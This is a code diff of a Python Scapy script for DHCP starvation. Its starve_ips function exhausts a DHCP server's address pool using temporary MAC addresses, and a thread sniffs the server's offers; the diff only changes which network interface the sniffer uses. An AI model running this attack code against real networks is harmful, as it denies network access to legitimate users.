@@ -14,7 +14,6 @@ logger = logging.getLogger()
 IP_GLOBAL_BROADCAST='255.255.255.255'
 
 PKT_TTL = 5
-SNIFF_INTERFACE = None
 
 
 def get_dhcp_type_value(dhcp_type : str):
@@ -139,7 +138,7 @@ def capture_my_dhcp_offer(dest_mac : str, interface : str = conf.iface , result_
     function_name = inspect.currentframe().f_code.co_name
 
     logger.info(f"{function_name} : sniffing on interface {interface} for dhcp offers for {dest_mac}")
-    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=SNIFF_INTERFACE)
+    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=interface)
 
     if len(res) != 0:
         result_list[0] = res[0]
@@ -226,7 +225,7 @@ def is_bootp_reply(packet)->bool:
 
 
 
-def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface ,sniff_interface : str = conf.iface, ips_to_starve : int = 5, keep_alive = False, pkt_to_use : Packet = None)->list[tuple[str, str, str]]:
+def starve_ips( server_ip : str,server_mac : str ,interface : str = conf.iface ,ips_to_starve : int = 5, keep_alive = False, pkt_to_use : Packet = None)->list[tuple[str, str, str]]:
     """
     TODO check if dhcp request if acked
     TODO warn about NAKs
@@ -273,7 +272,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
 
         offer = [None]
         
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac, sniff_interface ,offer])
+        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac , interface, offer])
         sniff_thread.start()
         
         time.sleep(0.2)
